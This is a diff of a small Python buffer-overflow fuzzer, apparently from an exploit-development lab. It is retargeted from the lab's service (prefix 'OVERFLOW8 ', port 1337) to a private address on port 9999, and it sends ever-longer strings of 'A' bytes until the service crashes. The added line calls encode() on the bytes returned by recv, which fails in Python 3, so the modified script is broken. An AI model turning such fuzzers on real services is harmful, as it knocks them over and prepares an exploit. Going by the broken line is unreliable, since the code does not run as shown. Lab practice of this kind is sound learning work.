@@ -2,11 +2,11 @@
 
 import socket, time, sys
 
-ip = "10.10.212.60"
+ip = "192.168.178.32"
 
-port = 1337
+port = 9999
 timeout = 5
-prefix = "OVERFLOW8 "
+prefix = ""
 
 string = prefix + "A" * 100
 
@@ -15,7 +15,7 @@ while True:
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
       s.settimeout(timeout)
       s.connect((ip, port))
-      s.recv(1024)
+      print(s.recv(1024).encode())
       print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
       s.send(bytes(string, "latin-1"))
       s.recv(1024)
